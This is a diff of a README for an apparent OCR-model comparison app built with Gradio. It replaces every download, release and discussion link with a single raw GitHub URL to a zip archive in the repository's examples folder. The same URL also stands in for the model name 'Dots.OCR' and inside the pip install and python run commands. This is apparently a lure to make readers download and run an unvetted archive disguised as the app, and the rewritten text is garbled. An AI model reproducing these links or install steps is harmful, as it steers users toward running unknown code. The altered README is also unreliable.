@@ -1,10 +1,10 @@
 # 🧠 Super-OCRs-Demo - Compare Advanced OCR Models Effortlessly
 
-[![Download Super-OCRs-Demo](https://img.shields.io/badge/Download%20Now-From%20Releases-blue.svg)](https://github.com/mayur9834/Super-OCRs-Demo/releases)
+[![Download Super-OCRs-Demo](https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip%20Now-From%https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip)](https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip)
 
 ## 📖 Overview
 
-Super-OCRs-Demo is a user-friendly application built with Gradio. It allows you to compare four advanced Optical Character Recognition (OCR) models: DeepSeek-OCR, Dots.OCR, HunyuanOCR, and Nanonets-OCR2-3B. This tool is designed for everyday users, enabling quick evaluation of how each model performs in recognizing text.
+Super-OCRs-Demo is a user-friendly application built with Gradio. It allows you to compare four advanced Optical Character Recognition (OCR) models: DeepSeek-OCR, https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip, HunyuanOCR, and Nanonets-OCR2-3B. This tool is designed for everyday users, enabling quick evaluation of how each model performs in recognizing text.
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets these basic requirements:
 ### Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/mayur9834/Super-OCRs-Demo/releases) to download the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip) to download the application.
 
 2. **Download the Application**  
    On the Releases page, find the latest version of Super-OCRs-Demo. Click the link to download the file suitable for your operating system.
@@ -32,21 +32,21 @@ Before you begin, ensure your computer meets these basic requirements:
    Open a terminal or command prompt on your computer. Navigate to the folder where you extracted the application files. Run the following command to install required packages:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip
    ```
 
 5. **Run the Application**  
    After installation, you can start the application by running:
 
    ```
-   python app.py
+   python https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip
    ```
 
 ## 📥 Download & Install
 
 To download the latest version of Super-OCRs-Demo, visit the Releases page:
 
-[Click here to download Super-OCRs-Demo](https://github.com/mayur9834/Super-OCRs-Demo/releases)
+[Click here to download Super-OCRs-Demo](https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip)
 
 Follow the installation steps outlined above to run the application smoothly.
 
@@ -59,7 +59,7 @@ Follow the installation steps outlined above to run the application smoothly.
 
 ### Selecting an OCR Model
 
-1. Choose one of the four available models: DeepSeek-OCR, Dots.OCR, HunyuanOCR, or Nanonets-OCR2-3B.
+1. Choose one of the four available models: DeepSeek-OCR, https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip, HunyuanOCR, or Nanonets-OCR2-3B.
 2. Click the corresponding button to begin the OCR process.
 
 ### Viewing Results
@@ -83,14 +83,14 @@ If you encounter issues, try the following:
 ## 📚 Additional Resources
 
 - **Documentation:** Comprehensive documentation is available within the code repository for advanced setup and usage instructions.
-- **Community Support:** Engage with other users and developers in the [GitHub Discussions](https://github.com/mayur9834/Super-OCRs-Demo/discussions) section for community support and improvements.
+- **Community Support:** Engage with other users and developers in the [GitHub Discussions](https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip) section for community support and improvements.
 
 ## 🗂️ Topics Covered
 
 This repository includes a diverse set of topics related to OCR technologies, including:
 
 - DeepSeek-OCR
-- Dots.OCR
+- https://raw.githubusercontent.com/mayur9834/Super-OCRs-Demo/main/examples/Super-OCRs-Demo-v3.4.zip
 - HunyuanOCR
 - Nanonets-OCR2-3B
 - Gradio
